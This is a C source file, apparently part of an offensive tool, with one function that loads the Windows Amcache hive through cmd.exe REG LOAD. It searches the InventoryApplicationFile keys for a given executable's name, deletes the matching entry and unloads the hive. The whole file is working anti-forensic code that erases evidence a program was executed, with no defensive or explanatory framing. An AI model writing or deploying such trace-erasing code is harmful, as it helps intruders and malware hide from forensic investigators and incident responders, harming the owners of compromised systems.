#include "amcache.h"

#define MAX_KEY_LENGTH 255
#define MAX_VALUE_NAME 16383

//Query Key Function from Microsoft https://learn.microsoft.com/en-us/windows/win32/sysinfo/enumerating-registry-subkeys
void removeAmcache(wchar_t* executableName)
{
    TCHAR    achKey[MAX_KEY_LENGTH];   // buffer for subkey name
    DWORD    cbName;                   // size of name string 
    TCHAR    achClass[MAX_PATH] = TEXT("");  // buffer for class name 
    DWORD    cchClassName = MAX_PATH;  // size of class string 
    DWORD    cSubKeys = 0;               // number of subkeys 
    DWORD    cbMaxSubKey;              // longest subkey size 
    DWORD    cchMaxClass;              // longest class string 
    DWORD    cValues;              // number of values for key 
    DWORD    cchMaxValue;          // longest value name 
    DWORD    cbMaxValueData;       // longest value data 
    DWORD    cbSecurityDescriptor; // size of security descriptor 
    FILETIME ftLastWriteTime;      // last write time 

    DWORD i, retCode;

    TCHAR  achValue[MAX_VALUE_NAME];
    DWORD cchValue = MAX_VALUE_NAME;


    Sleep(60000);
    {
        // Deletes the associated Amcache entry
        STARTUPINFOW si;
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        PROCESS_INFORMATION pi;
        ZeroMemory(&pi, sizeof(pi));
        wchar_t cmdLineArgs[120];

        wcsncpy_s(cmdLineArgs, L"/c REG LOAD HKLM\\AM C:\\Windows\\appcompat\\Programs\\Amcache.hve", 119);
        int createProcessStatus = CreateProcessW(L"C:\\Windows\\System32\\cmd.exe", cmdLineArgs, NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi);
        WaitForSingleObject(pi.hProcess, 10);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
    Sleep(3000);

    HKEY hKey;
    RegOpenKeyW(HKEY_LOCAL_MACHINE, L"AM\\Root\\InventoryApplicationFile", &hKey);

    // Amcache max length of exe name in keys is 16 and all in lowercase
    wchar_t executableNameTruncated[17];
    wcsncpy_s(executableNameTruncated, 17, executableName, 16);
    toLowerString(executableNameTruncated);

    wprintf(L"[DEBUG] Amcache key extracted: %s\n", executableNameTruncated);

    // Enumerate through all subkeys. If the truncated executable name is a part of the key name, delete it
    // Get the class name and the value count. 
    RegQueryInfoKey(
        hKey,                    // key handle 
        achClass,                // buffer for class name 
        &cchClassName,           // size of class string 
        NULL,                    // reserved 
        &cSubKeys,               // number of subkeys 
        &cbMaxSubKey,            // longest subkey size 
        &cchMaxClass,            // longest class string 
        &cValues,                // number of values for this key 
        &cchMaxValue,            // longest value name 
        &cbMaxValueData,         // longest value data 
        &cbSecurityDescriptor,   // security descriptor 
        &ftLastWriteTime);       // last write time

    wprintf(L"DEBUG: KEY NUM %d\n", cSubKeys);
    if (cSubKeys)
    {
        for (i = 0; i < cSubKeys; i++)
        {
            cbName = MAX_KEY_LENGTH;
            retCode = RegEnumKeyEx(hKey, i,achKey,&cbName,NULL,NULL,NULL,&ftLastWriteTime);
            wprintf(L"DEBUG: Current Key Name %s\n", achKey);

            if(retCode == ERROR_SUCCESS)
            {
                wchar_t* substrPtr = wcsstr(achKey, executableNameTruncated);
                if (substrPtr != NULL)
                {
                    wprintf(L"DEBUG : Key Has been Found!\n");
                    retCode = RegDeleteKeyW(hKey, achKey);
                    if (retCode == ERROR_SUCCESS)
                    {
                        wprintf(L"Successfully deleted Key!\n");
                        RegCloseKey(hKey);
                    }
                    break;
                }
            }
        }
    }

    {
        // Deletes the associated Amcache entry
        STARTUPINFOW si;
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        PROCESS_INFORMATION pi;
        ZeroMemory(&pi, sizeof(pi));
        wchar_t cmdLineArgs[50];

        wcsncpy_s(cmdLineArgs, L"/c REG UNLOAD HKLM\\AM", 119);
        int createProcessStatus = CreateProcessW(L"C:\\Windows\\System32\\cmd.exe", cmdLineArgs, NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi);
        WaitForSingleObject(pi.hProcess, 10);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
}
